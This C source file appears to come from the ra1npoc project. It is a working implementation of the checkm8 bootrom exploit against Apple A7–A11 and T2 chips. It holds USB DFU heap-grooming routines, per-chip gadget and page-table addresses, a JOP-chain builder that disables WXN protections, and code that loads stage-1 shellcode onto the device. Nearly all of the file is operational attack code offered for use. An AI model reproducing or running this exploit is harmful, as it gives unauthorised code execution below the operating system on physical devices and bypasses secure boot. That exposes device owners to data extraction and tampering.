/*
 * ra1npoc - exploit/new.c
 *
 * Copyright (c) 2021 - 2023 kok3shidoll
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */

#include <io/iousb.h>
#include <common/log.h>
#include <common/common.h>

#include "shellcode/src/s5l8960.h"
#include "shellcode/src/t7000.h"
#include "shellcode/src/t7001.h"
#include "shellcode/src/s8000.h"
#include "shellcode/src/s8003.h"
#include "shellcode/src/s8001.h"
#include "shellcode/src/t8010.h"
#include "shellcode/src/t8011.h"
#include "shellcode/src/t8012.h"
#include "shellcode/src/t8015.h"

static checkra1n_payload_t payload;

// WXN is enable on ROM for A9X and later
RA1NPOC_STATIC_API static bool isWNX(uint64_t cpid)
{
    if((cpid == 0x8015) /* Apple A11  */ ||
       (cpid == 0x8012) /* Apple T2   */ ||
       (cpid == 0x8011) /* Apple A10X */ ||
       (cpid == 0x8010) /* Apple A10  */ ||
       (cpid == 0x8001) /* Apple A9X  */ )
    {
        return true;
    }
    return false;
}

RA1NPOC_STATIC_API static int setupStage(client_t *client, uint16_t cpid)
{
    transfer_t result;
    int i = 0;
    
    LOG("Setting up the checkm8 exploit");
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    
    unsigned int push = 0;
    unsigned int size = 0;
    unsigned int loop = 0;
    unsigned int timeout = 0;
    unsigned int abort_timeout = 0;
    UInt32 sent = 0;
    
    /* Apple A8 */
    if(cpid == 0x7000)
    {
        push = 0x500;
        timeout = 5;
        abort_timeout = 1000;
    }
    
    /* Apple A8X */
    if(cpid == 0x7001)
    {
        push = 0x500;
        timeout = 5;
        abort_timeout = 1000;
    }
    
    /* Apple A9 */
    if(cpid == 0x8000)
    {
        push = 0x500;
        timeout = 5;
        abort_timeout = 1000;
    }
    if(cpid == 0x8003)
    {
        push = 0x500;
        timeout = 5;
        abort_timeout = 1000;
    }
    
    /* Apple A9X */
    if(cpid == 0x8001)
    {
        push = 0x7C0;
        loop = 1;
        timeout = 5;
        abort_timeout = 1000;
    }
    
    /* Apple A10 */
    if(cpid == 0x8010)
    {
        push = 0x7C0;
        loop = 1;
        timeout = 5;
        abort_timeout = 100;
    }
    
    /* Apple A10X */
    if(cpid == 0x8011)
    {
        push = 0x540;
        loop = 6;
        timeout = 5;
        abort_timeout = 100;
    }
    
    /* Apple T2 */
    if(cpid == 0x8012)
    {
        push = 0x540;
        loop = 6;
        timeout = 5;
        abort_timeout = 100;
    }
    
    /* Apple A11 */
    if(cpid == 0x8015)
    {
        push = 0x540;
        loop = 6;
        timeout = 5;
        abort_timeout = 100;
    }
    
    
    // transfer test
    result = IOUSBControlTransferTO(client, 0x21, 1, 0x0000, 0x0000, blank, DFU_MAX_TRANSFER_SZ, 100);
    DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    
    while(1)
    {
        sent = IOUSBAsyncControlTransferWithCancel(client, 0x21, 1, 0x0000, 0x0000, blank, push + 0x40, timeout, abort_timeout);
        
        if(sent >= push)
            goto retry;
        
        size = push;
        size -= sent;
        
        DEVLOG("Sent 0x%08x", (unsigned int)sent);
        
        result = IOUSBControlTransferTO(client, 0, 0, 0x0000, 0x0000, blank, size, 100);
        DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
        
        if(isStalled(result.ret))
            break;
        
    retry:
        i++;
        preRetry(client, i);
        abort_timeout += 100;
        if(i%10 == 0)
        {
            usleep(500000);
        }
    }
    
    
    if(isWNX(cpid))
    {
        while(1)
        {
            sent = IOUSBAsyncControlTransferWithCancel(client, 0x80, 6, 0x0304, 0x040a, blank, 3 * EP0_MAX_PACKET_SZ, 100, 1);
            DEVLOG("Sent 0x%08x", (unsigned int)sent);
            
            result = USBReqLeak(client, blank);
            DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
            
            if(sent != (3 * EP0_MAX_PACKET_SZ) && isTimeout(result.ret))
                break;
        }
    }
    else
    {
        result = USBReqStall(client);
        DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
        result = USBReqLeak(client, blank);
        DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    }
    
    if(isWNX(cpid))
    {
        for(i=0; i<loop; i++)
        {
            result = USBReqStall(client);
            DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
        }
    }
    
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    result = IOUSBControlTransferTO(client, 0x21, 4, 0x0000, 0x0000, blank, 3 * EP0_MAX_PACKET_SZ + 1, 100);
    DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    
    
    usleep(100000);
    
    return 0;
}

RA1NPOC_STATIC_API static int triggerStage(client_t *client, checkra1n_payload_t payload)
{
    __unused transfer_t result;
    
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    
    result = USBReqStall(client);
    DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    result = USBReqStall(client);
    DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    
    uint64_t* p = (uint64_t*)blank;
    p[5] = payload.next;
    result = IOUSBControlTransferTO(client, 0, 0, 0x0000, 0x0000, (unsigned char *)p, 0x30, 100);
    DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    
    {
        size_t len = 0;
        size_t size;
        while(len < payload.stage1_len)
        {
            size = ((payload.stage1_len - len) > DFU_MAX_TRANSFER_SZ) ? DFU_MAX_TRANSFER_SZ : (payload.stage1_len - len);
            result = sendDataTO(client, (unsigned char*)&payload.stage1[len], size, 100);
            DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
            len += size;
        }
    }
    
    result = sendAbort(client);
    DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    
    sleep(1);
    
    return 0;
}

RA1NPOC_STATIC_API static int ra1npocCheckmate(client_t *client, checkra1n_payload_t payload, uint16_t cpid)
{
    
    if(setupStage(client, cpid))
    {
        ERR("Failed to setup checkm8");
        client = NULL;
        return -1;
    }
    
    usleep(500000);
    
    LOG("Reconnecting device");
    if(IOUSBConnect(client, kDeviceDFUModeID, 5, (kDeviceUSBResetDevice|kDeviceUSBReEnumerate), 10000))
    {
        ERR("Failed to reconnect to device");
        client = NULL;
        return -1;
    }
    LOG("Found DFU mode device");
    
    usleep(100000);
    
    if(triggerStage(client, payload))
    {
        ERR("Failed to trigger checkm8");
        client = NULL;
        return -1;
    }
    
    return 0;
}

RA1NPOC_STATIC_API static int ra1npocCheckmateA7(client_t *client, checkra1n_payload_t payload)
{
    transfer_t result;
    int i = 0;
    
    LOG("Setting up the checkm8 exploit");
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    
    result = IOUSBControlTransferTO(client, 0x21, 1, 0x0000, 0x0000, blank, DFU_MAX_TRANSFER_SZ, 100);
    DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    
    unsigned int push = 0x7C0;
    unsigned int size = 0;
    UInt32 sent = 0;
    
    unsigned int timeout = 10000;
    unsigned int abort_timeout = timeout - 1;
    
    while(1)
    {
        sent = IOUSBAsyncControlTransferWithCancel(client, 0x21, 1, 0x0000, 0x0000, blank, push+0x40, timeout, abort_timeout);
        
        if(sent >= push)
            goto retry;
        
        size = push;
        size -= sent;
        
        DEVLOG("Sent 0x%08x", (unsigned int)sent);
        
        result = IOUSBControlTransferTO(client, 0, 0, 0x0000, 0x0000, blank, size, 100);
        DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
        
        if(isStalled(result.ret))
            break;
        
    retry:
        i++;
        preRetry(client, i);
        abort_timeout++;
    }
    
    
    
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    result = IOUSBControlTransferTO(client, 0x21, 1, 0x0000, 0x0000, NULL, 0, 100);
    DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    result = IOUSBControlTransferTO(client, 0xa1, 3, 0x0000, 0x0000, blank, 6, 100);
    DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    result = IOUSBControlTransferTO(client, 0xa1, 3, 0x0000, 0x0000, blank, 6, 100);
    DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    
    timeout = 1000;
    abort_timeout = timeout - 1;
    while(1)
    {
        sent = IOUSBAsyncControlTransferWithCancel(client, 0x80, 6, 0x0304, 0x040a, blank, 128, timeout, abort_timeout);
        DEVLOG("Sent 0x%08x", (unsigned int)sent);
        
        result = IOUSBControlTransferTO(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
        DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
        
        if(sent != 128 && isTimeout(result.ret))
            break;
    }
    
    result = IOUSBControlTransferTO(client, 0x02, 3, 0x0000, 128, NULL, 0, 10);
    DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    
    result = IOUSBControlTransferTO(client, 0x80, 8, 0x0000, 0x0000, blank, 129, 100);
    DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    
    usleep(500000);
    
    LOG("Reconnecting device");
    if(IOUSBConnect(client, kDeviceDFUModeID, 5, (kDeviceUSBResetDevice|kDeviceUSBReEnumerate), 10000))
    {
        ERR("Failed to reconnect to device");
        client = NULL;
        return -1;
    }
    LOG("Found DFU mode device");
    
    usleep(100000);
    
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    uint64_t* p = (uint64_t*)blank;
    p[0] = 0x0000000000000000;
    p[1] = 0x52b0070110201d80;
    p[2] = 0xd2c00020b9000001;
    p[3] = 0xd61f0000f2808480;
    p[4] = 0x0000000180082bc8;
    p[5] = 0x0000000000000000;
    result = IOUSBControlTransferTO(client, 0x02, 3, 0x0000, 128, (unsigned char *)p, 0x30, 100);
    DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    
    {
        size_t len = 0;
        size_t size;
        while(len < payload.stage1_len)
        {
            size = ((payload.stage1_len - len) > DFU_MAX_TRANSFER_SZ) ? DFU_MAX_TRANSFER_SZ : (payload.stage1_len - len);
            result = sendDataTO(client, (unsigned char*)&payload.stage1[len], size, 100);
            DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
            len += size;
        }
    }
    
    result = IOUSBControlTransferTO(client, 0x21, 1, 0x0000, 0x0000, (unsigned char *)p, 0x30, 100);
    DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    result = IOUSBControlTransferTO(client, 0x21, 1, 0x0000, 0x0000, NULL, 0, 100);
    DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    result = IOUSBControlTransferTO(client, 0xa1, 3, 0x0000, 0x0000, NULL, 0, 100);
    DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    result = IOUSBControlTransferTO(client, 0xa1, 3, 0x0000, 0x0000, NULL, 0, 100);
    DEVLOG("Result 0x%08x (%s)", result.ret, IOReturnName(result.ret));
    
    
    usleep(500000);
    
    LOG("Reconnecting device");
    if(IOUSBConnect(client, kDeviceDFUModeID, 5, (kDeviceUSBResetDevice|kDeviceUSBReEnumerate), 10000))
    {
        ERR("Failed to reconnect to device");
        client = NULL;
        return -1;
    }
    LOG("Found DFU mode device");
    
    return 0;
}

RA1NPOC_STATIC_API static int generateStage1(uint16_t cpid, void **stage1Buf, size_t *stage1Len)
{
    unsigned char* buf = NULL;
    size_t size = 0;
    
    void* shellcode = NULL;
    size_t shellcodeLen = 0;
    
    uint64_t base_address                       = 0;
    uint64_t func_gadget                        = 0;
    uint64_t write_prim                         = 0;
    uint64_t write_prim2                        = 0;
    uint64_t arm_clean_invalidate_dcache_line   = 0;
    uint64_t arm_invalidate_icache              = 0;
    uint64_t enter_critical_section             = 0;
    uint64_t exit_critical_section              = 0;
    uint64_t write_ttbr0                        = 0;
    uint64_t tlbi                               = 0;
    
    uint64_t TTBR0_PATCH_BASE                   = 0;
    uint64_t TTBR0_BASE                         = 0;
    uint64_t bootstrap_task_lr                  = 0;
    uint32_t payload_start_offset               = 0;
    
    switch(cpid)
    {
        case 0x8960:
            // A7 should not be here.
            return 0;
            
        case 0x7000:
            base_address                        = 0x180380000;
            func_gadget                         = 0x10000ddf4;
            write_prim                          = 0x10000bc2c;
            arm_clean_invalidate_dcache_line    = 0x100000448;
            arm_invalidate_icache               = 0x100000424;
            
            bootstrap_task_lr                   = 0x1800c2f68;
            payload_start_offset                = 0xc0;
            
            shellcodeLen                        = t7000_bin_len;
            shellcode                           = t7000_bin;
            break;
            
        case 0x7001:
            base_address                        = 0x180380000;
            func_gadget                         = 0x100010df4;
            write_prim                          = 0x10000ed5c;
            arm_clean_invalidate_dcache_line    = 0x100000448;
            arm_invalidate_icache               = 0x100000424;
            
            bootstrap_task_lr                   = 0x1800c2f68;
            payload_start_offset                = 0xc0;
            
            shellcodeLen                        = t7001_bin_len;
            shellcode                           = t7001_bin;
            break;
            
        case 0x8000:
            base_address                        = 0x180380000;
            func_gadget                         = 0x10000de0c;
            write_prim2                         = 0x100001bc0;
            arm_clean_invalidate_dcache_line    = 0x10000042c;
            arm_invalidate_icache               = 0x100000408;
            
            bootstrap_task_lr                   = 0x1800c2f58;
            payload_start_offset                = 0xc0;
            
            shellcodeLen                        = s8000_bin_len;
            shellcode                           = s8000_bin;
            break;
            
        case 0x8003:
            base_address                        = 0x180380000;
            func_gadget                         = 0x10000de0c;
            write_prim2                         = 0x100001bc0;
            arm_clean_invalidate_dcache_line    = 0x10000042c;
            arm_invalidate_icache               = 0x100000408;
            
            bootstrap_task_lr                   = 0x1800c2f58;
            payload_start_offset                = 0xc0;
            
            shellcodeLen                        = s8003_bin_len;
            shellcode                           = s8003_bin;
            break;
            
        case 0x8001:
            base_address                        = 0x180000000;
            func_gadget                         = 0x10000cd38;
            write_prim2                         = 0x100001a78;
            arm_clean_invalidate_dcache_line    = 0x10000043c;
            arm_invalidate_icache               = 0x100000418;
            enter_critical_section              = 0x100009b24;
            exit_critical_section               = 0x100009b88;
            write_ttbr0                         = 0x1000003b4;
            tlbi                                = 0x100000404;
            
            TTBR0_PATCH_BASE                    = 0x180004000;
            TTBR0_BASE                          = 0x50000;
            bootstrap_task_lr                   = 0x180059f58;
            payload_start_offset                = 0x600;
            
            shellcodeLen                        = s8001_bin_len;
            shellcode                           = s8001_bin;
            break;
            
        case 0x8010:
            base_address                        = 0x1800b0000;
            func_gadget                         = 0x10000cc44;
            write_prim2                         = 0x100001808;
            arm_clean_invalidate_dcache_line    = 0x10000046c;
            arm_invalidate_icache               = 0x100000448;
            enter_critical_section              = 0x10000A4B8;
            exit_critical_section               = 0x10000A514;
            write_ttbr0                         = 0x1000003E4;
            tlbi                                = 0x100000434;
            
            TTBR0_PATCH_BASE                    = 0x1800b4000;
            TTBR0_BASE                          = 0xa0000;
            bootstrap_task_lr                   = 0x1800a9f68;
            payload_start_offset                = 0x600;
            
            shellcodeLen                        = t8010_bin_len;
            shellcode                           = t8010_bin;
            break;
            
        case 0x8011:
            base_address                        = 0x1800b0000;
            func_gadget                         = 0x10000cce4;
            write_prim2                         = 0x100001804;
            arm_clean_invalidate_dcache_line    = 0x10000047c;
            arm_invalidate_icache               = 0x100000458;
            enter_critical_section              = 0x10000a658;
            exit_critical_section               = 0x10000a6a0;
            write_ttbr0                         = 0x1000003F4;
            tlbi                                = 0x100000444;
            
            TTBR0_PATCH_BASE                    = 0x1800b4000;
            TTBR0_BASE                          = 0xa0000;
            bootstrap_task_lr                   = 0x1800a9f88;
            payload_start_offset                = 0x600;
            
            shellcodeLen                        = t8011_bin_len;
            shellcode                           = t8011_bin;
            break;
            
        case 0x8012:
            base_address                        = 0x18001c000;
            func_gadget                         = 0x100008d8c;
            write_prim                          = 0x100008058;
            arm_clean_invalidate_dcache_line    = 0x1000004cc;
            arm_invalidate_icache               = 0x1000004a8;
            enter_critical_section              = 0x10000f9b8;
            exit_critical_section               = 0x10000fa00;
            write_ttbr0                         = 0x100000444;
            tlbi                                = 0x100000494;

            TTBR0_PATCH_BASE                    = 0x180020000;
            TTBR0_BASE                          = 0xc000;
            bootstrap_task_lr                   = 0x180015f78;
            payload_start_offset                = 0x600;

            shellcodeLen                        = t8012_bin_len;
            shellcode                           = t8012_bin;
          //break;
            ERR("Apple T2 is not supported!");
            return -1;
            
        case 0x8015:
            base_address                        = 0x18001c000;
            func_gadget                         = 0x10000a998;
            write_prim                          = 0x100009c48;
            arm_clean_invalidate_dcache_line    = 0x1000004e4;
            arm_invalidate_icache               = 0x1000004c0;
            enter_critical_section              = 0x10000f958;
            exit_critical_section               = 0x10000f9a0;
            write_ttbr0                         = 0x10000045c;
            tlbi                                = 0x1000004ac;
            
            TTBR0_PATCH_BASE                    = 0x180020000;
            TTBR0_BASE                          = 0xc000;
            bootstrap_task_lr                   = 0x180015f88;
            payload_start_offset                = 0x600;
            
            shellcodeLen                        = t8015_bin_len;
            shellcode                           = t8015_bin;
            break;
            
        default:
            ERR("This device is not supported!");
            return -1;
    }
    
    size = isWNX(cpid) == true ? 0x600 : 0xc0;
    buf = malloc(size);
    
    // build JOP chain...?
    uint32_t nextOffset = 0;
    unsigned char* nextBuf = NULL;
    dfu_callback_t* cb = (dfu_callback_t*)buf;
    nextBuf = buf;
    
    uint32_t current_size = 0;
    int count = 0;
#define PUSH(end, func, arg0, arg1) \
{ \
count++; \
current_size = nextOffset + sizeof(dfu_callback_t); \
if(!(current_size > (isWNX(cpid) == true ? 0x600 : 0xc0))) \
{ \
cb->callback = func_gadget; \
if(count%3 == 0) \
nextOffset += 0x80; \
else \
nextOffset += 0x20; \
if(!end)cb->next = base_address + nextOffset; \
uint64_t* ptr = (uint64_t*)(cb); \
uint32_t* ptr32 = (uint32_t*)(cb); \
ptr[15] = func; \
if(func == write_prim) \
{ \
ptr[14] = (uint64_t)(arg0 - 4); \
ptr32[5] = (uint32_t)arg1; \
} \
else if(func == write_prim2) \
{ \
ptr[14] = (uint64_t)arg0; \
ptr32[5] = (uint32_t)arg1; \
} \
else if(func == write_ttbr0) \
{ \
ptr[14] = (uint64_t)arg0; \
} \
else if(func == arm_clean_invalidate_dcache_line) \
{ \
ptr[14] = (uint64_t)arg0; \
} \
nextBuf = (unsigned char*)(buf + nextOffset); \
cb = (dfu_callback_t*)nextBuf; \
} \
else \
{ \
ERR("overflow"); \
} \
} \
    
    uint32_t write_val = 0;
    uint64_t write_gadget = 0;
    
    if((cpid == 0x8015) || (cpid == 0x8012) || (cpid == 0x7001) || (cpid == 0x7000))
    {
        write_gadget = write_prim;
    }
    else
    {
        write_gadget = write_prim2;
    }
    
#define ARM_16K_TT_L2_SHIFT      25                    /* page descriptor shift */
    
    uint64_t vrom_address = 0x100000000;
    uint64_t sram_address = 0x180000000;
    uint64_t new_va       = 0x142000000; // post-exploit
    uint32_t vrom_off     = (vrom_address >> ARM_16K_TT_L2_SHIFT) * 8;
    uint32_t new_off      = (new_va       >> ARM_16K_TT_L2_SHIFT) * 8;
    uint32_t sram_off     = (sram_address >> ARM_16K_TT_L2_SHIFT) * 8;
    
    uint64_t sram_rx_va  = 0x140000000; // execute payload
    uint64_t sram_rw_va  = 0x142000000; // custom ttbr
    uint32_t sram_rx_off = (sram_rx_va >> ARM_16K_TT_L2_SHIFT) * 8;
    uint32_t sram_rw_off = (sram_rw_va >> ARM_16K_TT_L2_SHIFT) * 8;
    
    if(isWNX(cpid))
    {
        // only A9X-A11
        
        // VROM: 0x100000000
        uint64_t vrom_bit = vrom_address | 0x6a5;
        uint32_t vrom_bit_lower = (uint32_t)(vrom_bit & 0xffffffff);
        uint32_t vrom_bit_upper = (uint32_t)(vrom_bit >> 32);
        PUSH(0, write_gadget, TTBR0_PATCH_BASE + (vrom_off + 0), vrom_bit_lower);
        PUSH(0, write_gadget, TTBR0_PATCH_BASE + (vrom_off + 4), vrom_bit_upper);
        
        // Newp: 0x142000000
        uint64_t new_bit = sram_address | 0x621; // pa
        new_bit |= (cpid != 0x8001 ? (1uL << 2) : (2uL << 2));
        new_bit |= (1uL << 53); // PXN
        new_bit |= (1uL << 54); // XN
        uint32_t new_bit_lower  = (uint32_t)(new_bit & 0xffffffff);
        uint32_t new_bit_upper  = (uint32_t)(new_bit >> 32);
        PUSH(0, write_gadget, TTBR0_PATCH_BASE + (new_off + 0), new_bit_lower);
        PUSH(0, write_gadget, TTBR0_PATCH_BASE + (new_off + 4), new_bit_upper);
        
        // SRAM: 0x180000000
        uint64_t sram_bit = sram_address | 0x3;
        sram_bit |= (1uL << 63); // NS
        if(cpid == 0x8015) sram_bit |= 0x10000;
        if(cpid == 0x8012) sram_bit |= 0x10000;
        if(cpid == 0x8011) sram_bit |= 0xa4000;
        if(cpid == 0x8010) sram_bit |= 0xa4000;
        if(cpid == 0x8001) sram_bit |= 0x54000;
        uint32_t sram_bit_lower = (uint32_t)(sram_bit & 0xffffffff);
        uint32_t sram_bit_upper = (uint32_t)(sram_bit >> 32);
        PUSH(0, write_gadget, TTBR0_PATCH_BASE + (sram_off + 0), sram_bit_lower);
        PUSH(0, write_gadget, TTBR0_PATCH_BASE + (sram_off + 4), sram_bit_upper);
    }
    
    if(isWNX(cpid))
    {
        write_val = (uint32_t)(((base_address & 0x01FFFFFF) | (sram_rx_va & 0xffffffff)) + payload_start_offset);
    }
    else
    {
        write_val = (uint32_t)((base_address & 0xFFFFFFFF) + payload_start_offset);
    }
    PUSH(0, write_gadget, bootstrap_task_lr, write_val);
    
    if(isWNX(cpid))
    {
        // only A9X-A11
        PUSH(0, arm_clean_invalidate_dcache_line, TTBR0_PATCH_BASE + (vrom_off & ~0xff), 0);
        PUSH(0, arm_clean_invalidate_dcache_line, TTBR0_PATCH_BASE + (new_off  & ~0xff), 0);
        PUSH(0, arm_clean_invalidate_dcache_line, TTBR0_PATCH_BASE + (sram_off & ~0xff), 0);
    }
    PUSH(0, arm_clean_invalidate_dcache_line, base_address + payload_start_offset, 0);
    PUSH(isWNX(cpid) == true ? 0 : 1, arm_invalidate_icache, 0, 0);
    
    if(isWNX(cpid))
    {
        // only A9X-A11
        uint64_t sram_rx_bit = sram_address | 0x6a5;
        uint32_t sram_rx_bit_lower = (uint32_t)(sram_rx_bit & 0xffffffff);
        uint32_t sram_rx_bit_upper = (uint32_t)(sram_rx_bit >> 32);
        
        uint64_t sram_rw_bit = sram_address | 0x621;
        sram_rw_bit |= (cpid != 0x8001 ? (1uL << 2) : (2uL << 2));
        sram_rw_bit |= (1uL << 53); // PXN
        sram_rw_bit |= (1uL << 54); // XN
        uint32_t sram_rw_bit_lower = (uint32_t)(sram_rw_bit & 0xffffffff);
        uint32_t sram_rw_bit_upper = (uint32_t)(sram_rw_bit >> 32);
        
        PUSH(0, enter_critical_section, 0, 0);
        PUSH(0, write_ttbr0, TTBR0_PATCH_BASE, 0);
        PUSH(0, tlbi, 0, 0);
        
        PUSH(0, write_gadget, sram_rw_va + TTBR0_BASE + (sram_rx_off + 0), sram_rx_bit_lower);
        PUSH(0, write_gadget, sram_rw_va + TTBR0_BASE + (sram_rx_off + 4), sram_rx_bit_upper);
        
        PUSH(0, write_gadget, sram_rw_va + TTBR0_BASE + (sram_rw_off + 0), sram_rw_bit_lower);
        PUSH(0, write_gadget, sram_rw_va + TTBR0_BASE + (sram_rw_off + 4), sram_rw_bit_upper);
        PUSH(0, arm_clean_invalidate_dcache_line, sram_rw_va + TTBR0_BASE + (sram_rx_off & ~0xff), 0);
        PUSH(0, write_ttbr0, sram_address + TTBR0_BASE, 0);
        PUSH(0, tlbi, 0, 0);
        PUSH(1, exit_critical_section, 0, 0);
    }
    
    *stage1Len = shellcodeLen + (isWNX(cpid) == true ? 0x600 : 0xc0);
    *stage1Buf = malloc(*stage1Len);
    
    memset(*stage1Buf, 0x0, *stage1Len);
    memcpy(*stage1Buf, buf, isWNX(cpid) == true ? 0x600 : 0xc0);
    memcpy(*stage1Buf + (isWNX(cpid) == true ? 0x600 : 0xc0), shellcode, shellcodeLen);
    free(buf);
    
    DEVLOG("Payload size: %d", (int)*stage1Len);
    
    return 0;
}

RA1NPOC_API int ra1npoc15(client_t *client, uint16_t cpid)
{
    void* stage1Buf = NULL;
    size_t stage1Len = 0;
    
    if(generateStage1(cpid, &stage1Buf, &stage1Len))
    {
        ERR("Failed to generate shellcode");
        return -1;
    }
    
    switch(cpid)
    {
        case 0x8960: /* Apple A7 */
            payload.next        = 0x180380000;
            payload.stage1_len  = s5l8960_bin_len;
            payload.stage1      = s5l8960_bin;
            break;
            
        case 0x7000: /* Apple A8 */
            payload.next        = 0x180380000;
            payload.stage1_len  = stage1Len;
            payload.stage1      = stage1Buf;
            break;
            
        case 0x7001: /* Apple A8X */
            payload.next        = 0x180380000;
            payload.stage1_len  = stage1Len;
            payload.stage1      = stage1Buf;
            break;
            
        case 0x8000: /* Apple A9 */
            payload.next        = 0x180380000;
            payload.stage1_len  = stage1Len;
            payload.stage1      = stage1Buf;
            break;
            
        case 0x8003: /* Apple A9 */
            payload.next        = 0x180380000;
            payload.stage1_len  = stage1Len;
            payload.stage1      = stage1Buf;
            break;
            
        case 0x8001: /* Apple A9X */
            payload.next        = 0x180000000;
            payload.stage1_len  = stage1Len;
            payload.stage1      = stage1Buf;
            break;
            
        case 0x8010: /* Apple A10 */
            payload.next        = 0x1800b0000;
            payload.stage1_len  = stage1Len;
            payload.stage1      = stage1Buf;
            break;
            
        case 0x8011: /* Apple A10X */
            payload.next        = 0x1800b0000;
            payload.stage1_len  = stage1Len;
            payload.stage1      = stage1Buf;
            break;
            
        case 0x8012: /* Apple T2 */
            payload.next        = 0x18001c000;
            payload.stage1_len  = stage1Len;
            payload.stage1      = stage1Buf;
            break;
            
        case 0x8015: /* Apple A11 */
            payload.next        = 0x18001c000;
            payload.stage1_len  = stage1Len;
            payload.stage1      = stage1Buf;
            break;
            
        default:
            return -1;
    }
    
    if(cpid == 0x8960)
    {
        // A7 uses a different exploit strategy
        return ra1npocCheckmateA7(client, payload);
    }
    
    // A8-A11
    return ra1npocCheckmate(client, payload, cpid);
}
